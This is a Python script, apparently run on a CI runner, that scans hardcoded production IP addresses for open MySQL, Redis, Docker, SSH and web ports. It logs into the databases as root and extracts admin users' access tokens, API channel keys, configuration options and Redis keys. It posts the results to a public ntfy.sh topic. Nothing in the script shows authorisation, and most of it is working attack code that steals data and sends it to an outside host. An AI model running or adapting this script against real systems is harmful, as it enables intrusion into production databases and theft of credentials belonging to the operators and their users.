#!/usr/bin/env python3
# i47851 mechanism AH: from fresh GHA runner EIP, real TCP handshake + auth to prod MySQL/Redis data plane.
import os, sys, socket, json, time, random, urllib.request

PW = os.environ.get("DBPW", "")
JOB = os.environ.get("JOB", "0")
TOPIC = os.environ.get("TOPIC", "")
DATAPLANE = [
    ("main-mysql","40.160.50.80",3306,"mysql"),
    ("main-redis","40.160.50.80",6379,"redis"),
    ("mirror-mysql","135.148.234.41",3306,"mysql"),
    ("mirror-redis","135.148.234.41",6379,"redis"),
    ("68229-mysql","40.160.68.229",3306,"mysql"),
    ("68229-redis","40.160.68.229",6379,"redis"),
]
EXTRA = [
    ("68229-ssh","40.160.68.229",22),
    ("68229-2375","40.160.68.229",2375),
    ("68229-2376","40.160.68.229",2376),
    ("68229-8000","40.160.68.229",8000),
    ("68229-8080","40.160.68.229",8080),
]
CTRL = [
    ("CTRL-main3100","40.160.50.80",3100),
    ("CTRL-mirror3000","135.148.234.41",3000),
    ("CTRL-68229-3100","40.160.68.229",3100),
]

def log(*a): print(" ".join(str(x) for x in a), flush=True)

def ntfy(tag, text):
    if not TOPIC: return
    text=str(text)
    for i in range(0,len(text),3500):
        try:
            req=urllib.request.Request("https://ntfy.sh/"+TOPIC,
                data=((("[j%s %d] ")%(JOB,i//3500+1))+text[i:i+3500]).encode("utf-8","replace"),
                method="POST", headers={"Title":("i47851-"+tag)[:60]})
            urllib.request.urlopen(req,timeout=12).read()
        except Exception as e: log("NTFYERR",str(e)[:60])

def egress():
    for u in ("https://api.ipify.org","https://icanhazip.com","https://ifconfig.me/ip"):
        try: return urllib.request.urlopen(u,timeout=8).read().decode().strip()
        except Exception: pass
    return "ERR"

def tcp(ip,port,t=8.0):
    st=time.time()
    try:
        s=socket.create_connection((ip,port),timeout=t); s.close()
        return "OPEN",round(time.time()-st,2)
    except socket.timeout: return "TIMEOUT",round(time.time()-st,2)
    except ConnectionRefusedError: return "REFUSED",round(time.time()-st,2)
    except Exception as e: return "ERR:"+type(e).__name__,round(time.time()-st,2)

def mysql_probe(ip,port):
    import pymysql
    out={"mysql":[]}
    # negative control first: wrong password
    try:
        pymysql.connect(host=ip,port=port,user="root",password="WRONG_"+str(random.randint(10**8,10**9)),
                        connect_timeout=10,read_timeout=20).close()
        out["mysql"].append("NEGCTRL_WRONG_PW_ACCEPTED(!=open/no-auth suspect)")
    except Exception as e:
        out["mysql"].append("negctrl_wrong_rejected: %s"%str(e)[:70])
    try:
        c=pymysql.connect(host=ip,port=port,user="root",password=PW,connect_timeout=10,read_timeout=30,charset="utf8mb4")
        cur=c.cursor()
        cur.execute("SELECT VERSION()"); out["mysql"].append("version=%s"%cur.fetchone()[0])
        cur.execute("SHOW DATABASES"); dbs=[r[0] for r in cur.fetchall()]
        out["mysql"].append("databases=%s"%dbs)
        if "yibuapi" in dbs:
            cur.execute("USE yibuapi")
            cur.execute("SHOW TABLES"); tabs=[r[0] for r in cur.fetchall()]
            out["mysql"].append("yibuapi_tables=%s"%tabs)
            try:
                cur.execute("SELECT id,username,role,access_token FROM users WHERE role>=10 ORDER BY role DESC LIMIT 30")
                rows=cur.fetchall()
                out["mysql"].append("ROLE>=10_USERS=%s"%json.dumps([{"id":r[0],"u":r[1],"role":r[2],"access_token":r[3]} for r in rows]))
            except Exception as e: out["mysql"].append("users_q_err:%s"%str(e)[:90])
            try:
                cur.execute("SELECT COUNT(*) FROM users"); out["mysql"].append("users_count=%s"%cur.fetchone()[0])
            except Exception as e: pass
            for t in ("options","channels","tokens"):
                if t in tabs:
                    try:
                        if t=="options":
                            cur.execute("SELECT `key`,`value` FROM options LIMIT 200")
                            kv={str(k):(str(v)[:120]) for k,v in cur.fetchall()}
                            out["mysql"].append("OPTIONS=%s"%json.dumps(kv)[:2500])
                        elif t=="channels":
                            cur.execute("SELECT id,name,type,base_url,LEFT(`key`,90) FROM channels LIMIT 60")
                            out["mysql"].append("CHANNELS=%s"%json.dumps([{"id":r[0],"name":r[1],"type":r[2],"base_url":r[3],"key":r[4]} for r in cur.fetchall()])[:4000])
                        elif t=="tokens":
                            cur.execute("SELECT COUNT(*) FROM tokens"); out["mysql"].append("tokens_count=%s"%cur.fetchone()[0])
                    except Exception as e: out["mysql"].append("%s_q_err:%s"%(t,str(e)[:90]))
        c.close()
        out["mysql"].append("AUTH_OK_readonly")
    except Exception as e:
        out["mysql"].append("auth_fail:%s"%str(e)[:90])
    return out

def redis_probe(ip,port):
    import redis as R
    out={"redis":[]}
    try:
        rw=R.Redis(host=ip,port=port,password="WRONG"+str(random.randint(10**6,10**9)),socket_timeout=10)
        rw.ping(); out["redis"].append("NEGCTRL_WRONG_PW_ACCEPTED(!suspect)")
    except Exception as e:
        out["redis"].append("negctrl_wrong_rejected:%s"%str(e)[:70])
    try:
        r=R.Redis(host=ip,port=port,password=PW,socket_timeout=12)
        out["redis"].append("ping=%s"%r.ping())
        info=r.info("server"); out["redis"].append("redis_version=%s"%info.get("redis_version"))
        try:
            d=dict(r.config_get("dir")); out["redis"].append("dir=%s"%d)
        except Exception as e: out["redis"].append("cfgdir_err:%s"%str(e)[:60])
        try:
            ks=[k.decode() if isinstance(k,bytes) else k for k in list(r.scan_iter(count=50))[:40]]
            out["redis"].append("sample_keys=%s"%ks)
        except Exception as e: out["redis"].append("scan_err:%s"%str(e)[:60])
        out["redis"].append("AUTH_OK_readonly")
    except Exception as e:
        out["redis"].append("auth_fail:%s"%str(e)[:90])
    return out

def main():
    log("### i47851 JOB=%s start %s egress=%s"%(JOB,time.strftime("%H:%M:%S"),egress()))
    results={}
    for label,ip,port,kind in DATAPLANE:
        state,el=tcp(ip,port)
        rec={"state":state,"elapsed":el}
        log("### %s %s:%d -> %s %ss"%(label,ip,port,state,el))
        if state=="OPEN" and os.environ.get("DBPW"):
            try:
                rec.update(mysql_probe(ip,port) if kind=="mysql" else redis_probe(ip,port))
            except Exception as e:
                rec["probe_err"]=str(e)[:120]
        elif state=="OPEN":
            rec["note"]="OPEN_noauth_pw_not_set"
        results[label]=rec
    for label,ip,port in EXTRA+CTRL:
        state,el=tcp(ip,port)
        results[label]={"state":state,"elapsed":el}
        log("### %s %s:%d -> %s %ss"%(label,ip,port,state,el))
    blob=json.dumps(results,ensure_ascii=False)
    log("### FULLRESULT "+blob)
    open("result_%s.json"%JOB,"w").write(blob)
    # summary line for ntfy
    summ={k:(v.get("state") if isinstance(v,dict) else v) for k,v in results.items()}
    opens={k:v for k,v in results.items() if isinstance(v,dict) and v.get("state")=="OPEN"}
    ntfy("SUMMARY","egress_j%s %s OPEN=%s"%(JOB,json.dumps(summ),json.dumps(opens,ensure_ascii=False)[:3000]))

if __name__=="__main__": main()
